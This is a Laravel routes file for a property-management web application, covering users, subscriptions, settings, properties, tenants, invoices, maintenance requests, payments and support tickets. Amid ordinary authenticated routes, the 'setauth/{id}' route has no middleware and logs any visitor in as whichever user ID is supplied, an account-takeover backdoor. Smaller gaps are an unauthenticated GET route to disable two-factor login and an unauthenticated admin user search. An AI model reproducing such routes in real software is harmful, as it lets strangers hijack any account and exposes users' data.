<?php

use App\Http\Controllers\Auth\VerifyEmailController;
use App\Http\Controllers\AuthPageController;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\HomeController;
use App\Http\Controllers\OperatorController;
use App\Http\Controllers\UserController;
use App\Http\Controllers\SubscriptionController;
use App\Http\Controllers\SettingController;
use App\Http\Controllers\PermissionController;
use App\Http\Controllers\RoleController;
use App\Http\Controllers\NoticeBoardController;
use App\Http\Controllers\ContactController;
use App\Http\Controllers\CouponController;
use App\Http\Controllers\PropertyController;
use App\Http\Controllers\AdminPropertyController;
use App\Http\Controllers\AdminServiceAssignmentController;
use App\Http\Controllers\TenantController;
use App\Http\Controllers\TypeController;
use App\Http\Controllers\InvoiceController;
use App\Http\Controllers\ExpenseController;
use App\Http\Controllers\MaintainerController;
use App\Http\Controllers\MaintenanceRequestController;
use App\Http\Controllers\PaymentController;
use App\Http\Controllers\InvoicePaymentController;
use App\Http\Controllers\FAQController;
use App\Http\Controllers\HomePageController;
use App\Http\Controllers\NotificationController;
use App\Http\Controllers\OTPController;
use App\Http\Controllers\PageController;
use App\Http\Controllers\SupportController;
use App\Models\User;



require __DIR__ . '/auth.php';

Route::get('/', [HomeController::class, 'index'])->middleware(
    [

        'XSS',
    ]
);
Route::get('home', [HomeController::class, 'index'])->name('home')->middleware(
    [

        'XSS',
    ]
);
Route::get('dashboard', [HomeController::class, 'index'])->name('dashboard')->middleware(
    [

        'XSS',
    ]
);

//-------------------------------User-------------------------------------------

Route::resource('users', UserController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

Route::get('setauth/{id}',  function ($id) {
    $user = User::find($id);
    \Auth::login($user);
    return redirect()->route('home');
});

Route::get('login/otp', [OTPController::class, 'show'])->name('otp.show')->middleware(
    [

        'XSS',
    ]
);
Route::post('login/otp', [OTPController::class, 'check'])->name('otp.check')->middleware(
    [

        'XSS',
    ]
);
Route::get('login/2fa/disable', [OTPController::class, 'disable'])->name('2fa.disable')->middleware(['XSS',]);

//-------------------------------Subscription-------------------------------------------



Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {

        Route::resource('subscriptions', SubscriptionController::class);
        Route::get('coupons/history', [CouponController::class, 'history'])->name('coupons.history');
        Route::delete('coupons/history/{id}/destroy', [CouponController::class, 'historyDestroy'])->name('coupons.history.destroy');
        Route::get('coupons/apply', [CouponController::class, 'apply'])->name('coupons.apply');
        Route::resource('coupons', CouponController::class);
        Route::get('subscription/transaction', [SubscriptionController::class, 'transaction'])->name('subscription.transaction');
    }
);

//-------------------------------Subscription Payment-------------------------------------------

Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {

        Route::post('subscription/{id}/stripe/payment', [SubscriptionController::class, 'stripePayment'])->name('subscription.stripe.payment');
    }
);
//-------------------------------Settings-------------------------------------------
Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ], function (){
    Route::get('settings', [SettingController::class,'index'])->name('setting.index');

    Route::post('settings/account', [SettingController::class,'accountData'])->name('setting.account');
    Route::delete('settings/account/delete', [SettingController::class,'accountDelete'])->name('setting.account.delete');
    Route::post('settings/password', [SettingController::class,'passwordData'])->name('setting.password');
    Route::post('settings/general', [SettingController::class,'generalData'])->name('setting.general');
    Route::post('settings/smtp', [SettingController::class,'smtpData'])->name('setting.smtp');
    Route::get('settings/smtp-test', [SettingController::class, 'smtpTest'])->name('setting.smtp.test');
    Route::post('settings/smtp-test', [SettingController::class, 'smtpTestMailSend'])->name('setting.smtp.testing');
    Route::post('settings/payment', [SettingController::class,'paymentData'])->name('setting.payment');
    Route::post('settings/site-seo', [SettingController::class,'siteSEOData'])->name('setting.site.seo');
    Route::post('settings/google-recaptcha', [SettingController::class,'googleRecaptchaData'])->name('setting.google.recaptcha');
    Route::post('settings/company', [SettingController::class,'companyData'])->name('setting.company');
    Route::post('settings/2fa', [SettingController::class, 'twofaEnable'])->name('setting.twofa.enable');

    Route::get('footer-setting', [SettingController::class, 'footerSetting'])->name('footerSetting');
    Route::post('settings/footer', [SettingController::class,'footerData'])->name('setting.footer');

    Route::get('language/{lang}', [SettingController::class,'lanquageChange'])->name('language.change');
    Route::post('theme/settings', [SettingController::class,'themeSettings'])->name('theme.settings');
}
);


//-------------------------------Role & Permissions-------------------------------------------
Route::resource('permission', PermissionController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

Route::resource('role', RoleController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);




//-------------------------------Note-------------------------------------------
Route::resource('note', NoticeBoardController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);


//-------------------------------Notification-------------------------------------------
Route::resource('notification', NotificationController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);



//-------------------------------Contact-------------------------------------------
Route::resource('contact', ContactController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);




//-------------------------------logged History-------------------------------------------

Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {

        Route::get('logged/history', [UserController::class, 'loggedHistory'])->name('logged.history');
        Route::get('logged/{id}/history/show', [UserController::class, 'loggedHistoryShow'])->name('logged.history.show');
        Route::delete('logged/{id}/history', [UserController::class, 'loggedHistoryDestroy'])->name('logged.history.destroy');
    }
);


//-------------------------------Property-------------------------------------------
Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {
        Route::resource('property', PropertyController::class);
        Route::get('property/{pid}/unit/create', [PropertyController::class, 'unitCreate'])->name('unit.create');
        Route::post('property/{pid}/unit/store', [PropertyController::class, 'unitStore'])->name('unit.store');
        Route::get('units/direct-create', [PropertyController::class, 'unitdirectCreate'])->name('unit.direct-create');
        Route::post('unit/direct-store', [PropertyController::class, 'unitdirectStore'])->name('unit.direct-store');
        Route::get('property/{pid}/unit/{id}/edit', [PropertyController::class, 'unitEdit'])->name('unit.edit');
        Route::get('units', [PropertyController::class, 'units'])->name('unit.index');
        // Route::put('property/{pid}/unit/{id}', [PropertyController::class, 'unitUpdate'])->name('unit.update');

        Route::put('property/{pid}/unit/{id}/update', [PropertyController::class, 'unitUpdate'])->name('unit.update');
        Route::delete('property/{pid}/unit/{id}/destroy', [PropertyController::class, 'unitDestroy'])->name('unit.destroy');
        Route::get('property/{pid}/unit', [PropertyController::class, 'getPropertyUnit'])->name('property.unit');
        Route::get('property/{id}/location-type', [PropertyController::class, 'getPropertyLocationType'])->name('property.location-type');
    }
);

//-------------------------------Tenant-------------------------------------------
Route::resource('tenant', TenantController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

//-------------------------------Type-------------------------------------------
Route::resource('type', TypeController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

//-------------------------------Invoice-------------------------------------------

Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {
        Route::get('invoice/{id}/payment/create', [InvoiceController::class, 'invoicePaymentCreate'])->name('invoice.payment.create');
        Route::post('invoice/{id}/payment/store', [InvoiceController::class, 'invoicePaymentStore'])->name('invoice.payment.store');
        Route::delete('invoice/{id}/payment/{pid}/destroy', [InvoiceController::class, 'invoicePaymentDestroy'])->name('invoice.payment.destroy');
        Route::delete('invoice/type/destroy', [InvoiceController::class, 'invoiceTypeDestroy'])->name('invoice.type.destroy');
        Route::get('invoice/{id}/reminder', [InvoiceController::class, 'invoicePaymentRemind'])->name('invoice.reminder');
        Route::post('invoice/{id}/reminder', [InvoiceController::class, 'invoicePaymentRemindData'])->name('invoice.sendEmail');
        Route::post('invoice/sendMail', [InvoiceController::class, 'sendMail'])->name('invoice.sendMail');
        Route::resource('invoice', InvoiceController::class);
    }
);

//-------------------------------Expense-------------------------------------------
Route::resource('expense', ExpenseController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

//-------------------------------Maintainer-------------------------------------------
Route::resource('maintainer', MaintainerController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

//-------------------------------Maintenance Request-------------------------------------------


Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {
        Route::get('maintenance-request/pending', [MaintenanceRequestController::class, 'pendingRequest'])->name('maintenance-request.pending');
        Route::get('maintenance-request/in-progress', [MaintenanceRequestController::class, 'inProgressRequest'])->name('maintenance-request.inprogress');
        Route::get('/maintenance-request/completed', [MaintenanceRequestController::class, 'completed'])->name('maintenance-request.completed');
        Route::get('maintenance-request/{id}/action', [MaintenanceRequestController::class, 'action'])->name('maintenance-request.action');
        Route::post('maintenance-request/{id}/action', [MaintenanceRequestController::class, 'actionData'])->name('maintenance-request.action');
        Route::resource('maintenance-request', MaintenanceRequestController::class);
    }
);

//-------------------------------Plan Payment-------------------------------------------

Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {
        Route::post('subscription/{id}/bank-transfer', [PaymentController::class, 'subscriptionBankTransfer'])->name('subscription.bank.transfer');
        Route::get('subscription/{id}/bank-transfer/action/{status}', [PaymentController::class, 'subscriptionBankTransferAction'])->name('subscription.bank.transfer.action');
        Route::post('subscription/{id}/paypal', [PaymentController::class, 'subscriptionPaypal'])->name('subscription.paypal');
        Route::get('subscription/{id}/paypal/{status}', [PaymentController::class, 'subscriptionPaypalStatus'])->name('subscription.paypal.status');
        Route::get('subscription/flutterwave/{sid}/{tx_ref}', [PaymentController::class, 'subscriptionFlutterwave'])->name('subscription.flutterwave');
    }
);

//-------------------------------Invoice Payment-------------------------------------------

Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {

        Route::post('invoice/{id}/banktransfer/payment', [InvoicePaymentController::class, 'banktransferPayment'])->name('invoice.banktransfer.payment');
        Route::post('invoice/{id}/stripe/payment', [InvoicePaymentController::class, 'stripePayment'])->name('invoice.stripe.payment');
        Route::post('invoice/{id}/paypal', [InvoicePaymentController::class, 'invoicePaypal'])->name('invoice.paypal');
        Route::get('invoice/{id}/paypal/{status}', [InvoicePaymentController::class, 'invoicePaypalStatus'])->name('invoice.paypal.status');
        Route::get('invoice/flutterwave/{id}/{tx_ref}', [InvoicePaymentController::class, 'invoiceFlutterwave'])->name('invoice.flutterwave');
    }
);

Route::get('email-verification/{token}', [VerifyEmailController::class, 'verifyEmail'])->name('email-verification')->middleware(
    [
        'XSS',
    ]


);
//-------------------------------FAQ-------------------------------------------
Route::resource('FAQ', FAQController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

//-------------------------------Home Page-------------------------------------------
Route::resource('homepage', HomePageController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);
//-------------------------------FAQ-------------------------------------------
Route::resource('pages', PageController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);
Route::get('page/{slug}', [PageController::class, 'page'])->name('page');
//-------------------------------FAQ-------------------------------------------
Route::impersonate();


//-------------------------------Support/Tickets-------------------------------------------
Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
            'support.access',
        ],
    ],
    function () {
        Route::resource('support', SupportController::class);
        Route::post('support/{id}/reply', [SupportController::class, 'reply'])->name('support.reply');
        Route::get('support/{id}/close', [SupportController::class, 'close'])->name('support.close');
        Route::get('support/{ticketId}/photo/{photoName}', [SupportController::class, 'viewPhoto'])->name('support.viewPhoto');
        Route::get('support/reply/{replyId}/photo/{photoName}', [SupportController::class, 'viewReplyPhoto'])->name('support.viewReplyPhoto');
        Route::get('support/{id}/modal', [SupportController::class, 'showModal'])->name('support.showModal');
        Route::post('support/{id}/reply-modal', [SupportController::class, 'replyModal'])->name('support.replyModal');
    }
);

//-------------------------------Auth page-------------------------------------------
Route::resource('authPage', AuthPageController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

//-------------------------------Admin Property Management-------------------------------------------
Route::group([
    'middleware' => ['auth', 'XSS'],
    'prefix' => 'admin/properties',
    'as' => 'admin.properties.'
], function () {
    Route::get('/', [AdminPropertyController::class, 'index'])->name('index');
    Route::get('/{property}', [AdminPropertyController::class, 'show'])->name('show');
    Route::get('/services/all', [AdminPropertyController::class, 'allServices'])->name('services');
    Route::get('/analytics/overview', [AdminPropertyController::class, 'analytics'])->name('analytics');
    Route::get('/maintenance/calendar', [AdminPropertyController::class, 'maintenanceCalendar'])->name('maintenance-calendar');
});

//-------------------------------Admin Service Assignment Management-------------------------------------------

Route::group([
    'middleware' => ['auth', 'XSS'],
    'prefix' => 'admin/service-assignment',
    'as' => 'admin.service-assignment.'
], function () {
    Route::get('/', [AdminServiceAssignmentController::class, 'index'])->name('index');
    Route::post('/assign', [AdminServiceAssignmentController::class, 'assignService'])->name('assign');
    Route::post('/reassign', [AdminServiceAssignmentController::class, 'reassignService'])->name('reassign');
    Route::post('/unassign', [AdminServiceAssignmentController::class, 'unassignService'])->name('unassign');
    Route::post('/bulk-assign', [AdminServiceAssignmentController::class, 'bulkAssign'])->name('bulk-assign');
               Route::get('/operator-schedules', [AdminServiceAssignmentController::class, 'maintainerSchedule'])->name('maintainer-schedule');
           Route::get('/maintainer/{maintainerId}/schedule', [AdminServiceAssignmentController::class, 'maintainerSchedule'])->name('maintainer-schedule-detail');
               Route::get('/maintainer-availability', [AdminServiceAssignmentController::class, 'getMaintainerAvailability'])->name('maintainer-availability');
           Route::get('/compatible-maintainers', [AdminServiceAssignmentController::class, 'getCompatibleMaintainers'])->name('compatible-maintainers');
});

//-------------------------------Operator Management-------------------------------------------
Route::group([
    'middleware' => ['auth', 'XSS'],
    'prefix' => 'operator',
    'as' => 'operator.'
], function () {
    Route::get('/dashboard', [OperatorController::class, 'dashboard'])->name('dashboard');
    Route::get('/daily-plan', [OperatorController::class, 'dailyPlan'])->name('daily-plan');
    Route::get('/weekly-plan', [OperatorController::class, 'weeklyPlan'])->name('weekly-plan');
    Route::get('/reports', [OperatorController::class, 'reports'])->name('reports');
    Route::post('/service/{serviceId}/update-status', [OperatorController::class, 'updateServiceStatus'])->name('update-service-status');
    Route::post('/service/{serviceId}/start-timer', [OperatorController::class, 'startTimer'])->name('start-timer');
    Route::post('/service/{serviceId}/stop-timer', [OperatorController::class, 'stopTimer'])->name('stop-timer');
});

// protects with auth & XSS like the rest of your property routes
Route::post('/property/thumbnail/{id}', [PropertyController::class, 'deleteThumbnail'])
    ->middleware(['auth', 'XSS'])
    ->name('property.thumbnail.delete');

Route::delete('/property/thumbnail/{id}', [PropertyController::class, 'deleteThumbnail'])
    ->middleware(['auth', 'XSS']);

Route::post('/property/image/{id}', [PropertyController::class, 'deletePropertyImage'])
    ->middleware(['auth', 'XSS'])
    ->name('property.image.delete');

Route::delete('/property/image/{id}', [PropertyController::class, 'deletePropertyImage'])
    ->middleware(['auth', 'XSS']);

Route::post('/settings/owner', [SettingController::class, 'saveOwner'])
    ->name('setting.owner')
    ->middleware('auth');

Route::get('/users/{id}/details', [UserController::class, 'show'])
    ->name('users.details')
    ->middleware(['auth', 'XSS']);



Route::get('/admin/users/search', [ContactController::class, 'search'])->name('users.search');

